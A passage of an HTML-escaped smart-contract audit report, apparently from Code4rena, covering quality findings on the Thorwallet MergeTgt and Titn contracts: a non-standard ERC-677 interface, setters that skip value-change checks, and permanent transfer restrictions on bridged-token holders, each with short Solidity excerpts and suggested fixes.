class=\"mtk12\"\u003eMergeTgt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMerge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eOwnable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eReentrancyGuard\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonTokenTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eextraData\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003enonReentrant\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eUpdate the interface documentation to correctly reference ERC677.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"qa-03-use-of-non-standard-erc-677-token-interface\" style=\"position:relative;\"\u003e\u003ca href=\"#qa-03-use-of-non-standard-erc-677-token-interface\" aria-label=\"qa 03 use of non standard erc 677 token interface permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[QA-03] Use of Non-Standard ERC-677 Token Interface\u003c/h2\u003e\n\u003ch3 id=\"finding-description-and-impact-4\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-4\" aria-label=\"finding description and impact 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding Description and Impact\u003c/h3\u003e\n\u003cp\u003eThe protocol implements the ERC-677 token standard, which is not an officially finalized ERC standard. This introduces several risks:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe standard could change or be deprecated since it’s not finalized\u003c/li\u003e\n\u003cli\u003eLimited tooling and library support due to non-standardization\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"proof-of-concept-4\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eThe protocol implements \u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/interfaces/IERC677Receiver.sol#L8-L9\"\u003e\u003ccode\u003eIERC677Receiver\u003c/code\u003e\u003c/a\u003e interface:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"18\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// In IERC677Receiver.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003einterface\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eIERC677Receiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonTokenTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003eThis interface is used in \u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L64-L65\"\u003e\u003ccode\u003eMergeTgt.sol\u003c/code\u003e\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003eERC-677 is not listed in the final or last call standards on \u003ca href=\"https://eips.ethereum.org/erc\"\u003ehttps://eips.ethereum.org/erc\u003c/a\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eConsider migrating to the more standardized EIP-1363 (ERC-1363), which provides similar functionality but is better specified and maintained.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"qa-04-setter-functions-dont-check-for-value-changes\" style=\"position:relative;\"\u003e\u003ca href=\"#qa-04-setter-functions-dont-check-for-value-changes\" aria-label=\"qa 04 setter functions dont check for value changes permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[QA-04] Setter Functions Don’t Check for Value Changes\u003c/h2\u003e\n\u003cp\u003eThis issue results in unnecessary event emissions when setting values that are already at the desired value.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-5\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eThe following setter functions do not check if the new value differs from the current value:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L167-L168\"\u003esetLockedStatus\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/MergeTgt.sol#L172-L173\"\u003esetLaunchTime\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L33-L34\"\u003esetTransferAllowedContract\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-02-thorwallet/blob/98d7e936518ebd80e2029d782ffe763a3732a792/contracts/Titn.sol#L43-L44\"\u003esetBridgedTokenTransferLocked\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eAdd checks to compare new values with current values before performing the update and emitting events.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"qa-05-permanent-transfer-restrictions-on-bridged-tokens-due-to-immutable-isbridgedtokenholder-mapping\" style=\"position:relative;\"\u003e\u003ca href=\"#qa-05-permanent-transfer-restrictions-on-bridged-tokens-due-to-immutable-isbridgedtokenholder-mapping\" aria-label=\"qa 05 permanent transfer restrictions on bridged tokens due to immutable isbridgedtokenholder mapping permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e[QA-05] Permanent transfer restrictions on bridged tokens due to immutable isBridgedTokenHolder mapping\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eImpact\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eHigh. Addresses marked as bridged token holders cannot be unmarked, potentially leading to permanently locked tokens, even in legitimate cases.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eVulnerability Details\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eIn the Titn contract, addresses that receive bridged tokens are permanently marked in the isBridgedTokenHolder mapping with no way to remove them:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"19\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003emapping\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e=\u0026gt;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_credit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amountLD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ... other logic ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Addresses that bridged tokens have some transfer restrictions\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_to\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amountLD\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThese addresses are then restricted from transferring tokens:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_validateTransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eowner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etransferAllowedContract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokensTransferLocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eisBridgedTokenHolder\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echainid\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk12\"\u003earbitrumChainId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003elzEndpoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) 